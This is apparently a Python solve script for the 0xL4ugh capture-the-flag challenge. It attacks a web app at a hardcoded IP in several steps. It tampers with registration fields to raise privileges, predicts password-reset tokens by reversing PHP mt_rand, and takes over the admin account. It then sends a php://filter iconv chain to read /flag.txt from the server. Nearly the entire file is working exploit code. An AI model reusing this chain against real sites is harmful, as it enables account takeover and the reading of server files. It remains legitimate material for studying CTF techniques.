import requests 
import random, os, base64, binascii
from bs4 import BeautifulSoup as bs 

# 0xL4ugh{Ahhhhh_Hop3_U_Did_!t_by_Th3_Intended_W@@y}

HOST = "http://20.55.48.101"

s = requests.session()

email = random.randbytes(8).hex() + '@dimas.com'
password = random.randbytes(8).hex()

print("userid:", email)
print("userpw:", password)

r = s.post(f"{HOST}/mail/", 
                  data={ 
                      "email": email,
                      "password":password,
                      **{
                        "register-submit": 1,
                        "confirm-password": password
                      }
                  })
print(r.status_code)
r = s.post(f"{HOST}/register.php", 
                  data={ 
                      "email": email,
                      "password":password,
                      "level":226,
                      "confirmed":1,
                      **{'register-submit': 1}
                  })
print(r.status_code)
r = s.post(f"{HOST}/",
                  data={
                      "email": email,
                      "password": password, 
                      **{"login-submit": 1}
                  })
print(r.status_code)
# print(r.text)
r = s.post(f"{HOST}/mail/",
                  data={
                      "email": email,
                      "password": password, 
                      **{"login-submit": 1}
                  })
print(r.status_code)
# print(r.text)
r = s.post(f"{HOST}/forget_password.php",
           data={
               "email": email, 
               **{"recover-submit": 1}
           })
print(r.status_code)
# print(r.text)
r = s.get(f"{HOST}/mail/mail.php")
# print(r.text)
soup = bs(r.text, "html.parser")
raw_data = soup.select(".list-group > a")[1]["href"]
idx = raw_data.find("id=") + 3
last_id = raw_data[idx: idx + 37]

r = s.get(f"{HOST}/mail/mail_view.php",
          params={
              "id": last_id
          })
token1, token2 = r.text[r.text.find("tokens: ") + 8:r.text.find("<br>")].split(",")
token1, token2 = token1.strip(), token2.strip() 

print("Token1:",token1, "Token2:",token2)

seed = os.popen(f"python3 ./mt_rand-reverse/reverse_mt_rand.py {token1} {token2} 0 1").read().strip()
_, token3 = os.popen(f"php ./mt_rand-reverse/display_mt_rand.php {seed} 1").read().strip().split()
_, token4 = os.popen(f"php ./mt_rand-reverse/display_mt_rand.php {seed} 2").read().strip().split()

admin_email = "admin@ghazycorp.com"
new_admin_password = "asdfasdfasdfasdfasdfasdf"

r = s.get(f"{HOST}/wrong_reset_token.php",
          params={
              "email": admin_email, 
              "token1": token3,
              "token2": token4, 
              "new_password": new_admin_password
          })
print(r.status_code) 
print(r.text) 

s = requests.session() 

r = s.post(f"{HOST}/admin_login.php", 
           data={
               "email": admin_email, 
               "password": new_admin_password,
               **{"login-submit": 1}
           })
print(r.text)

r = s.post(f"{HOST}/user_photo.php",
           data={
               "img":"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=file:///flag.txt"
           })

b1 = base64.b64decode(r.text[r.text.find("base64,")+7:]).decode('utf-8')
print("FLAG:", base64.b64decode(b1[:b1.find("+")] + "=="))
